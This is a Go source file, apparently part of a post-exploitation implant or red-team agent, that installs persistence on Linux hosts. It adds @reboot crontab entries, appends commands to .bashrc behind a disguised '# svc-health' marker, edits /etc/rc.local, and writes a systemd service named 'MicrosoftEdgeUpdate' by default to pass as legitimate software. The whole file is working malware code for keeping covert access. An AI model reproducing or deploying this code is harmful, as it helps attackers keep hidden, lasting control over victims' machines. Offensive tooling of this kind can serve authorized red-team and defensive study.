//go:build !windows

package agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// persistMethod installs persistence using the given method.
// Methods: crontab, bashrc, rc.local, systemd, profile
func persistMethod(method, cmd, name string) (string, error) {
	switch strings.ToLower(method) {
	case "crontab", "cron":
		return persistCrontab(cmd, name)
	case "bashrc", "bash_profile", "profile":
		return persistBashrc(cmd, name)
	case "rc.local", "rclocal":
		return persistRCLocal(cmd, name)
	case "systemd", "service":
		return persistSystemd(cmd, name)
	default:
		return "", fmt.Errorf("unknown persistence method: %s (linux: crontab|bashrc|rc.local|systemd)", method)
	}
}

func persistCrontab(cmd, _ string) (string, error) {
	// Add @reboot entry via crontab -l | crontab -
	existing, _ := exec.Command("crontab", "-l").Output()
	entry := fmt.Sprintf("@reboot %s\n", cmd)
	if strings.Contains(string(existing), cmd) {
		return "already in crontab", nil
	}
	newCron := string(existing) + entry
	c := exec.Command("crontab", "-")
	c.Stdin = strings.NewReader(newCron)
	if out, err := c.CombinedOutput(); err != nil {
		return "", fmt.Errorf("crontab: %v %s", err, out)
	}
	return fmt.Sprintf("[+] crontab entry added: %s", entry), nil
}

func persistBashrc(cmd, _ string) (string, error) {
	home, _ := os.UserHomeDir()
	target := filepath.Join(home, ".bashrc")
	marker := "# svc-health"
	data, _ := os.ReadFile(target)
	if strings.Contains(string(data), marker) {
		return "already in .bashrc", nil
	}
	entry := fmt.Sprintf("\n%s\n%s &\n", marker, cmd)
	f, err := os.OpenFile(target, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return "", err
	}
	defer f.Close()
	f.WriteString(entry)
	return fmt.Sprintf("[+] .bashrc entry added: %s", target), nil
}

func persistRCLocal(cmd, _ string) (string, error) {
	target := "/etc/rc.local"
	data, err := os.ReadFile(target)
	if err != nil {
		return "", fmt.Errorf("rc.local: %v", err)
	}
	marker := "# svc-health"
	if strings.Contains(string(data), marker) {
		return "already in rc.local", nil
	}
	// insert before "exit 0"
	content := strings.Replace(string(data), "exit 0", fmt.Sprintf("%s\n%s &\nexit 0", marker, cmd), 1)
	if err := os.WriteFile(target, []byte(content), 0755); err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] rc.local entry added"), nil
}

func persistSystemd(cmd, name string) (string, error) {
	if name == "" {
		name = "MicrosoftEdgeUpdate"
	}
	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
`, name, cmd)
	path := fmt.Sprintf("/etc/systemd/system/%s.service", name)
	if err := os.WriteFile(path, []byte(unit), 0644); err != nil {
		// Try user systemd
		home, _ := os.UserHomeDir()
		path = filepath.Join(home, ".config/systemd/user", name+".service")
		os.MkdirAll(filepath.Dir(path), 0755)
		if err2 := os.WriteFile(path, []byte(unit), 0644); err2 != nil {
			return "", fmt.Errorf("systemd unit: %v / %v", err, err2)
		}
		exec.Command("systemctl", "--user", "enable", "--now", name).Run()
		return fmt.Sprintf("[+] user systemd service installed: %s", path), nil
	}
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "--now", name).Run()
	return fmt.Sprintf("[+] systemd service installed: %s", path), nil
}
